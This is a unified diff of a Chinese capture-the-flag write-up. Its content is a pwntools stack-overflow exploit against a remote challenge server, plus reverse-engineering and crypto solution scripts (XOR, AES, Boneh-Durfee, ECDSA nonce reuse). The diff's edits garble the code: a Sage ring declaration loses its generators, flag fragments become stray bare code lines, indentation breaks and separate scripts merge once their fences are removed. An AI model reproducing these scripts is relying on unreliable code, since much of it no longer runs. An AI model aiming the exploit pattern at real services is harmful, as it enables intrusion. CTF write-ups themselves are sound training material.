@@ -3,7 +3,7 @@
 > 原文: https://www.ctfiot.com/212654.html
 > ID: 212654
 
-WEB 
+WEB
 
 WEB02：
 
@@ -38,7 +38,7 @@ img
   })
   </script>
 
- PWN 
+ PWN
 
 PWN02
 
@@ -82,7 +82,7 @@ payload = (p32(0x080485E6)+p32(0)+p32(sh_address)).ljust(80,b"x00")+p32(stac-4
 io.sendlineafter("plz input your msg:n",payload)
 io.interactive()
 
- REVERSE 
+ REVERSE
 
 REVERSE01
 
@@ -137,16 +137,19 @@ s2=[0x70,0xCC,0x62,0xCA,0x60,0x6E,0x6C,0x6C]
 print("part1:",end='')
 for i in range(len(s2)):
     print(chr(round(s2[i]/2)),end='')
-# #part1:81fe0766
+# #part1:
+81fe0766
 
 data=[0x69,0x56,0x45,0x17,0x7D,0x0D,0x11,0x52]
 xor_key="XorrLord"
 print("npart2:",end='')
 for i in range(len(xor_key)):
     print(chr(data[i]^ord(xor_key[i])),end='')
-#part2:197e1bc6
+#part2:
+197e1bc6
 
-#part3:809832f4
+#part3:
+809832f4
 
 from Crypto.Cipher import AES
 
@@ -160,11 +163,12 @@ decrypted_data = cipher.decrypt(v4)
 
 print("npart4:", decrypted_data)
 
-#par4:d346fe66
+#par4:
+d346fe66
 
 拼接起来得到最终的flag为wdflag{81fe0766197e1bc6809832f4d346fe66}
 
- CRYPTO 
+ CRYPTO
 
 CRYPTO01
 
@@ -282,7 +286,7 @@ def boneh_durfee(pol, modulus, mm, tt, XX, YY):
     """
  
     # substitution (Herrman and May)
-    PR.<u, x, y> = PolynomialRing(ZZ)   #多项式环
+    PR. = PolynomialRing(ZZ)   #多项式环
     Q = PR.quotient(x*y + 1 - u)        #  u = xy + 1
     polZ = Q(pol).lift()
  
@@ -557,7 +561,8 @@ encrypted_flag_hex = '3cdbe372c9bc279e816336ad69b8247f4ec05647a7e97285dd641368
 encrypted_flag_bytes = binascii.unhexlify(encrypted_flag_hex)
 
 # 提取IV和密文
-iv = encrypted_flag_bytes[:AES.block_size]
+iv = encrypted_flag_bytes[:
+AES.block_size]
 ciphertext = encrypted_flag_bytes[AES.block_size:]
 
 # 创建AES解密对象
@@ -587,7 +592,7 @@ img
 
 img
 
- MISC 
+ MISC
 
 MISC01
 
@@ -707,16 +712,11 @@ ChaMd5 Venom 招收大佬入圈
     })
   })
   </script>
-```
-
-
-
-```
 from pwn import *
 context(os='linux',arch='i386',log_level='debug')
 libc=ELF("/lib/i386-linux-gnu/libc.so.6")
 elf=ELF('./pwn')
-#io=process("./pwn")
+    #io=process("./pwn")
 io=remote("0192d6192424783193117245846d79b9.8nz7.dg02.ciihw.cn",44958)
 sh_address=0x0804A038
 ret_address=0x08048674
@@ -733,33 +733,26 @@ payload = (p32(0x080485E6)+p32(0)+p32(sh_address)).ljust(80,b"x00")+p32(stac-4
 
 io.sendlineafter("plz input your msg:n",payload)
 io.interactive()
-```
-
-
-
-```
 data="Z0099864"
 print(data[::-1])
 #4689900Z
-```
-
-
-
-```
 s2=[0x70,0xCC,0x62,0xCA,0x60,0x6E,0x6C,0x6C]
 print("part1:",end='')
 for i in range(len(s2)):
     print(chr(round(s2[i]/2)),end='')
-# #part1:81fe0766
+# #part1:
+81fe0766
 
 data=[0x69,0x56,0x45,0x17,0x7D,0x0D,0x11,0x52]
 xor_key="XorrLord"
 print("npart2:",end='')
 for i in range(len(xor_key)):
     print(chr(data[i]^ord(xor_key[i])),end='')
-#part2:197e1bc6
+    #part2:
+197e1bc6
 
-#part3:809832f4
+    #part3:
+809832f4
 
 from Crypto.Cipher import AES
 
@@ -773,12 +766,8 @@ decrypted_data = cipher.decrypt(v4)
 
 print("npart4:", decrypted_data)
 
-#par4:d346fe66
-```
-
-
-
-```
+    #par4:
+d346fe66
 import time
 time.clock = time.time
  
@@ -883,7 +872,7 @@ def boneh_durfee(pol, modulus, mm, tt, XX, YY):
     """
  
     # substitution (Herrman and May)
-    PR.<u, x, y> = PolynomialRing(ZZ)   #多项式环
+    PR. = PolynomialRing(ZZ)   #多项式环
     Q = PR.quotient(x*y + 1 - u)        #  u = xy + 1
     polZ = Q(pol).lift()
  
@@ -1108,11 +1097,6 @@ def example():
         print('Running time: %s Seconds'%(end-start))
 if __name__ == "__main__":
     example()
-```
-
-
-
-```
 # 首先，根据椭圆曲线签名的性质，利用给定的r1, s1, z1, r2, s2, z2恢复dA
 from Crypto.Util.number import long_to_bytes
 from hashlib import sha256
@@ -1148,7 +1132,8 @@ encrypted_flag_hex = '3cdbe372c9bc279e816336ad69b8247f4ec05647a7e97285dd641368
 encrypted_flag_bytes = binascii.unhexlify(encrypted_flag_hex)
 
 # 提取IV和密文
-iv = encrypted_flag_bytes[:AES.block_size]
+iv = encrypted_flag_bytes[:
+AES.block_size]
 ciphertext = encrypted_flag_bytes[AES.block_size:]
 
 # 创建AES解密对象
@@ -1171,11 +1156,6 @@ for i, char in enumerate(plaintext.decode().upper()):
         decrypted_text += char
 
 print(decrypted_text)
-```
-
-
-
-```
 from PIL import Image
 from tqdm import tqdm
 
